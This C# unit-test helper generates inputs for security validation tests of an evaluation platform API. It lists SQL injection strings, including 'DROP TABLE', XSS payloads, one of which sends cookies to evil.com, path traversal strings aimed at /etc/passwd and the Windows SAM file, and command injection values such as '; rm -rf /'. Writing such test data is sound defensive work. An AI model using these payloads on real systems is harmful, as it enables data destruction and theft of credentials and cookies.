using SxgEvalPlatformApi.Models;
using SxgEvalPlatformApi.Models.Dtos;

namespace Sxg.EvalPlatform.API.UnitTests.Helpers;

/// <summary>
/// Generates test data for security validation tests including malicious and boundary-case inputs
/// SF-13-1: Input validation test data
/// SF-13-2: Malformed message structure test data
/// </summary>
public static class SecurityTestDataGenerator
{
    #region SQL Injection Payloads

    public static IEnumerable<string> GetSqlInjectionPayloads()
    {
        return new[]
        {
            "'; DROP TABLE EvalRuns--",
            "' OR '1'='1",
            "admin'--",
            "' OR 1=1--",
            "'; EXEC sp_MSForEachTable 'DROP TABLE ?'--",
            "1' UNION SELECT NULL, NULL, NULL--",
            "' AND 1=(SELECT COUNT(*) FROM tabname); --"
        };
    }

    #endregion

    #region XSS (Cross-Site Scripting) Payloads

    public static IEnumerable<string> GetXssPayloads()
    {
        return new[]
        {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"
        };
    }

    #endregion

    #region Path Traversal Payloads

    public static IEnumerable<string> GetPathTraversalPayloads()
    {
        return new[]
        {
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        };
    }

    #endregion

    #region Command Injection Payloads

    public static IEnumerable<string> GetCommandInjectionPayloads()
    {
        return new[]
        {
            "| ls -la",
            "; rm -rf /",
            "& dir",
            "&& whoami",
            "|| cat /etc/passwd",
            "`id`",
            "$(whoami)"
        };
    }

    #endregion

    #region Special Characters and Boundary Cases

    public static IEnumerable<string> GetSpecialCharacterPayloads()
    {
        return new[]
        {
            "",  // Empty string
            " ",  // Single space
            "   ",  // Multiple spaces
            "\0",  // Null character
            "\n\r\t",  // Whitespace characters
            new string('A', 1000),  // Very long string
            "??????",  // Emojis
            "????",  // Non-ASCII characters
            "'; --",  // SQL comment
            "\u0000\u0001\u0002"  // Control characters
        };
    }

    public static string GetStringOfLength(int length, char fillChar = 'A')
    {
        return new string(fillChar, length);
    }

    #endregion

    #region Invalid GUID/UUID Payloads

    public static IEnumerable<string> GetInvalidGuidPayloads()
    {
        return new[]
        {
            "not-a-guid",
            "12345",
            "00000000-0000-0000-0000-000000000000",  // Empty GUID (technically valid but often invalid in business logic)
            "ZZZZZZZZ-ZZZZ-ZZZZ-ZZZZ-ZZZZZZZZZZZZ",
            "550e8400-e29b-41d4-a716",  // Incomplete GUID
            "550e8400-e29b-41d4-a716-446655440000-extra"  // Extra characters
        };
    }

    #endregion

    #region Valid DTO Generators (for positive tests)

    public static CreateEvaluationDto GetValidCreateEvaluationDto()
    {
        return new CreateEvaluationDto
        {
            Name = "Valid Test Evaluation",
            Description = "A valid test description",
            CreatedBy = "test-user@example.com",
            Metadata = new Dictionary<string, object>
            {
                { "environment", "test" },
                { "version", "1.0" }
            }
        };
    }

    public static CreateEvalRunDto GetValidCreateEvalRunDto()
    {
        return new CreateEvalRunDto
        {
            AgentId = "test-agent-123",
            DataSetId = Guid.NewGuid(),
            MetricsConfigurationId = Guid.NewGuid(),
            Type = "MCS",
            EnvironmentId = "dev",
            AgentSchemaName = "TestAgentSchema",
            EvalRunName = "Test Evaluation Run"
        };
    }

    public static UpdateEvaluationDto GetValidUpdateEvaluationDto()
    {
        return new UpdateEvaluationDto
        {
            Name = "Updated Evaluation Name",
            Description = "Updated description",
            Status = "Completed",
            Score = 0.95
        };
    }

    public static SaveDatasetDto GetValidSaveDatasetDto()
    {
        return new SaveDatasetDto
        {
            AgentId = "test-agent-123",
            DatasetType = "Golden",
            DatasetName = "Test Dataset",
            DatasetRecords = new List<EvalDataset>
            {
                new EvalDataset
                {
                    Query = "Test query",
                    GroundTruth = "Test ground truth",
                    ActualResponse = "Test actual response",
                    Context = "Test context"
                }
            }
        };
    }

    #endregion

    #region Malformed JSON Payloads (for SF-13-2)

    public static IEnumerable<string> GetMalformedJsonPayloads()
    {
        return new[]
        {
            "{",  // Incomplete JSON
            "{ name: 'test' }",  // Invalid JSON (no quotes on key)
            "{ \"name\": }",  // Missing value
            "{ \"name\": \"test\", }",  // Trailing comma
            "null",  // Just null
            "undefined",  // Invalid value
            "{ \"circular\": this }",  // Circular reference attempt
            new string('{', 1000) + new string('}', 1000),  // Deeply nested
            "{ \"name\": \"\u0000\" }"  // Null byte in string
        };
    }

    #endregion

    #region Boundary Value Generators

    public static class BoundaryValues
    {
        public const int NameMaxLength = 100;
        public const int DescriptionMaxLength = 500;
        public const int TypeMaxLength = 50;
        public const int AgentSchemaNameMaxLength = 200;

        public static string GetNameAtMaxLength() => GetStringOfLength(NameMaxLength);
        public static string GetNameOverMaxLength() => GetStringOfLength(NameMaxLength + 1);
        public static string GetNameAtMinLength() => "A";
        public static string GetNameUnderMinLength() => "";

        public static string GetDescriptionAtMaxLength() => GetStringOfLength(DescriptionMaxLength);
        public static string GetDescriptionOverMaxLength() => GetStringOfLength(DescriptionMaxLength + 1);

        public static string GetTypeAtMaxLength() => GetStringOfLength(TypeMaxLength);
        public static string GetTypeOverMaxLength() => GetStringOfLength(TypeMaxLength + 1);
        public static string GetTypeAtMinLength() => "AB";
        public static string GetTypeUnderMinLength() => "A";

        public static string GetAgentSchemaNameAtMaxLength() => GetStringOfLength(AgentSchemaNameMaxLength);
        public static string GetAgentSchemaNameOverMaxLength() => GetStringOfLength(AgentSchemaNameMaxLength + 1);
    }

    #endregion

    #region Invalid Status Values

    public static IEnumerable<string> GetInvalidStatusValues()
    {
        return new[]
        {
            "InvalidStatus",
            "pending",  // Lowercase (may be invalid depending on implementation)
            "QUEUED",  // Uppercase
            "In Progress",  // With space
            "Cancelled",  // Not in enum
            "Paused",
            "Deleted",
            "",  // Empty
            "123",  // Numeric
            "True"  // Boolean as string
        };
    }

    #endregion

    #region Invalid Score Values

    public static IEnumerable<double> GetInvalidScoreValues()
    {
        return new[]
        {
            -1.0,  // Negative
            -0.5,
            1.5,  // Over 1.0
            100.0,  // Way over
            double.NaN,  // Not a number
            double.PositiveInfinity,
            double.NegativeInfinity,
            double.MinValue,
            double.MaxValue
        };
    }

    public static IEnumerable<double> GetValidScoreValues()
    {
        return new[]
        {
            0.0,
            0.5,
            0.95,
            1.0
        };
    }

    #endregion

    #region Large Dataset Generators (for performance/DoS testing)

    public static List<EvalDataset> GenerateLargeDataset(int recordCount)
    {
        var datasets = new List<EvalDataset>();
        for (int i = 0; i < recordCount; i++)
        {
            datasets.Add(new EvalDataset
            {
                Query = $"Test query {i}",
                GroundTruth = $"Test ground truth {i}",
                ActualResponse = $"Test actual response {i}",
                Context = $"Test context {i}"
            });
        }
        return datasets;
    }

    #endregion
}
